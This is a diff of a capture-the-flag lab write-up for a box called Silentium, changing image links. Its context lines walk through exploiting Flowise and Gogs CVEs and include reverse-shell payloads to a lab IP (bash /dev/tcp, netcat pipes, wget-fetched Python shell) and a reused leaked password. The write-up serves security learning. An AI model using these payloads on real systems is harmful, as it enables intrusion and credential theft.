@@ -14,7 +14,7 @@
 nmap -sCV 10.129.114.95
 ```
 
-![[Pasted image 20260922184520.png]]
+![](images/Pasted image 20260922184520.png)
 
 Two ports open:
 - **22/tcp** — OpenSSH 9.6p1 (Ubuntu)
@@ -26,15 +26,15 @@ Added the host to `/etc/hosts`:
 10.129.114.95   Silentium.htb staging.silentium.htb
 ```
 
-![[Pasted image 20260922184622.png]]
+![](images/Pasted image 20260922184622.png)
 
 ### Web Enumeration
 
 Visiting `silentium.htb` shows a fictional institutional finance company called **Silentium**. Scrolling the landing page reveals an "Institutional Leadership" section listing three employees: **Marcus Thorne** (Managing Director), **Ben** (Head of Financial Systems), and **Elena Rossi** (Chief Risk Officer). Ben becomes a useful username candidate.
 
-![[Pasted image 20260922184646.png]]
+![](images/Pasted image 20260922184646.png)
 
-![[Pasted image 20260922185817.png]]
+![](images/Pasted image 20260922185817.png)
 
 ### Subdomain Fuzzing
 
@@ -43,7 +43,7 @@ ffuf -u http://silentium.htb -H 'Host: FUZZ.silentium.htb' \
   -w SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
 ```
 
-![[Pasted image 20260922184722.png]]
+![](images/Pasted image 20260922184722.png)
 
 Discovered subdomain: **`staging.silentium.htb`**
 
@@ -54,7 +54,7 @@ ffuf -u http://silentium.htb/FUZZ \
   -w SecLists/Discovery/Web-Content/api/api-endpoints.txt
 ```
 
-![[Pasted image 20260922185059.png]]
+![](images/Pasted image 20260922185059.png)
 
 Multiple API endpoints return 200 with the same size — likely a SPA frontend returning the index on all routes. The interesting one is `/api/v1/version`.
 
@@ -65,9 +65,9 @@ curl -I http://staging.silentium.htb
 curl http://staging.silentium.htb/api/v1/version
 ```
 
-![[Pasted image 20260922185455.png]]
+![](images/Pasted image 20260922185455.png)
 
-![[Pasted image 20260922185523.png]]
+![](images/Pasted image 20260922185523.png)
 
 The version endpoint returns:
 
@@ -79,7 +79,7 @@ This identifies the staging app as **Flowise 3.0.5**.
 
 ### Vulnerability Research — Flowise 3.0.5
 
-![[Pasted image 20260922185603.png]]
+![](images/Pasted image 20260922185603.png)
 
 Searching for known CVEs against Flowise 3.0.5 reveals three critical issues:
 
@@ -93,13 +93,13 @@ Searching for known CVEs against Flowise 3.0.5 reveals three critical issues:
 
 The staging app at `staging.silentium.htb` presents a **Sign In** page with a "Forgot password?" link that leads to a token-based reset form.
 
-![[Pasted image 20260922185300.png]]
+![](images/Pasted image 20260922185300.png)
 
-![[Pasted image 20260922185313.png]]
+![](images/Pasted image 20260922185313.png)
 
 ### CVE-2025-58434 Details
 
-![[Pasted image 20260922195933.png]]
+![](images/Pasted image 20260922195933.png)
 
 The `/api/v1/account/forgot-password` endpoint accepts an email and responds directly with sensitive user data including the `tempToken` — no email is sent, and no authentication is required. This token can then be used at `/api/v1/account/reset-password` to set a new password without any verification.
 
@@ -107,7 +107,7 @@ Using **Ben** as the identified employee name, the target email is `ben@silentiu
 
 Sending the forgot-password request and intercepting the response:
 
-![[Pasted image 20260922195902.png]]
+![](images/Pasted image 20260922195902.png)
 
 The JSON response reveals:
 - `name`: admin
@@ -124,7 +124,7 @@ Using the `tempToken` at the reset endpoint successfully resets Ben's password, 
 
 ### CVE-2025-59528 Background
 
-![[Pasted image 20260922234629.png]]
+![](images/Pasted image 20260922234629.png)
 
 Flowise can act as a client to external tool servers over MCP (Model Context Protocol), and the `CustomMCP` node is where the operator types the configuration for one of those servers. The vulnerability exists in the `convertToValidJSONString` function, which passes user input directly to the `Function()` constructor — executing it as JavaScript with full Node.js runtime privileges, including access to `child_process` and `fs`.
 
@@ -151,7 +151,7 @@ curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
   }'
 ```
 
-![[Pasted image 20260922235719.png]]
+![](images/Pasted image 20260922235719.png)
 
 The response says "No Available Actions" — but that's the expected Flowise error when the MCP config doesn't define valid actions. The command still executes server-side.
 
@@ -164,7 +164,7 @@ sudo tcpdump -ni tun0 icmp
 # payload: ping -c 1 10.10.16.118
 ```
 
-![[Pasted image 20260923000409.png]]
+![](images/Pasted image 20260923000409.png)
 
 ICMP echo request received from `10.129.114.95` — RCE confirmed.
 
@@ -176,9 +176,9 @@ ICMP echo request received from `10.129.114.95` — RCE confirmed.
 cp.execSync("bash -i >& /dev/tcp/10.10.16.118/443 0>&1")
 ```
 
-![[Pasted image 20260923000733.png]]
+![](images/Pasted image 20260923000733.png)
 
-![[Pasted image 20260923000744.png]]
+![](images/Pasted image 20260923000744.png)
 
 **Attempt 2 — netcat pipe (got a connection but no shell):**
 
@@ -186,7 +186,7 @@ cp.execSync("bash -i >& /dev/tcp/10.10.16.118/443 0>&1")
 cp.execSync("which nc 2>&1 | nc 10.10.16.118 443")
 ```
 
-![[Pasted image 20260923001321.png]]
+![](images/Pasted image 20260923001321.png)
 
 nc is available but piping directly didn't yield an interactive shell.
 
@@ -204,7 +204,7 @@ os.dup2(s.fileno(),2)
 pty.spawn("sh")
 ```
 
-![[Pasted image 20260923002234.png]]
+![](images/Pasted image 20260923002234.png)
 
 Served it via a Python HTTP server and had the target fetch it:
 
@@ -215,7 +215,7 @@ sudo python3 -m http.server 80
 # payload: wget 10.10.16.118/rev.py 2>&1 | nc 10.10.16.118 443
 ```
 
-![[Pasted image 20260923004416.png]]
+![](images/Pasted image 20260923004416.png)
 
 The HTTP server confirmed the target fetched `rev.py` successfully (200 OK).
 
@@ -225,13 +225,13 @@ The HTTP server confirmed the target fetched `rev.py` successfully (200 OK).
 # payload: python rev.py 2>&1 | ncat 10.10.16.118 443
 ```
 
-![[Pasted image 20260923004400.png]]
+![](images/Pasted image 20260923004400.png)
 
-![[Pasted image 20260923004524.png]]
+![](images/Pasted image 20260923004524.png)
 
 **Shell received via ncat:**
 
-![[Pasted image 20260923004548.png]]
+![](images/Pasted image 20260923004548.png)
 
 Shell lands as root inside the Flowise Docker container (`10.129.114.95`).
 
@@ -245,7 +245,7 @@ Shell lands as root inside the Flowise Docker container (`10.129.114.95`).
 env
 ```
 
-![[Pasted image 20260923105038.png]]
+![](images/Pasted image 20260923105038.png)
 
 Key findings from the container environment:
 
@@ -265,7 +265,7 @@ The `SMTP_PASSWORD` (`r04D!!_R4ge`) is a strong credential reuse candidate.
 
 From outside the container (or via the shell), inspecting the host process list reveals the full infrastructure:
 
-![[Pasted image 20260923105054.png]]
+![](images/Pasted image 20260923105054.png)
 
 Key processes:
 - `root 1484` — `/opt/gogs/gogs/gogs web` — **Gogs** git service running as root
@@ -283,7 +283,7 @@ The SMTP password `r04D!!_R4ge` works for SSH as user `ben`:
 ssh ben@silentium.htb
 ```
 
-![[Pasted image 20260923110604.png]]
+![](images/Pasted image 20260923110604.png)
 
 Logged in as `ben@silentium`.
 
@@ -299,17 +299,17 @@ Checking the host reveals **Gogs 0.13.3** running as root:
 /opt/gogs/gogs/gogs -help
 ```
 
-![[Pasted image 20260923111420.png]]
+![](images/Pasted image 20260923111420.png)
 
 Gogs is accessible at `http://staging-v2-code.dev.silentium.htb` (nginx proxying to `127.0.0.1:3001`).
 
-![[Pasted image 20260923112831.png]]
+![](images/Pasted image 20260923112831.png)
 
 Checking the Gogs configuration at `/opt/gogs/gogs/custom/conf/app.ini`:
 
-![[Pasted image 20260923115855.png]]
+![](images/Pasted image 20260923115855.png)
 
-![[Pasted image 20260923120913.png]]
+![](images/Pasted image 20260923120913.png)
 
 Key config details:
 - `RUN_USER = root` — Gogs runs as root
@@ -319,9 +319,9 @@ Key config details:
 
 ### CVE-2025-8110 Background
 
-![[Pasted image 20260923120931.png]]
+![](images/Pasted image 20260923120931.png)
 
-![[Pasted image 20260923122214.png]]
+![](images/Pasted image 20260923122214.png)
 
 Gogs 0.13.3 is vulnerable to **CVE-2025-8110** — a symlink traversal in the `PutContents` API. An authenticated user can:
 
@@ -332,9 +332,9 @@ Gogs 0.13.3 is vulnerable to **CVE-2025-8110** — a symlink traversal in the `P
 
 ### Exploit
 
-![[Pasted image 20260923122302.png]]
+![](images/Pasted image 20260923122302.png)
 
-![[Pasted image 20260923122630.png]]
+![](images/Pasted image 20260923122630.png)
 
 Used the exploit script (modified for existing user `lalo` / `Admin.123`) targeting `http://staging-v2-code.dev.silentium.htb`:
 
@@ -343,7 +343,7 @@ python3 CVE-2025-8110.py -u http://staging-v2-code.dev.silentium.htb \
   -lh 10.10.16.244 -lp 443
 ```
 
-![[Pasted image 20260923125338.png]]
+![](images/Pasted image 20260923125338.png)
 
 The exploit:
 1. Authenticated as `lalo`
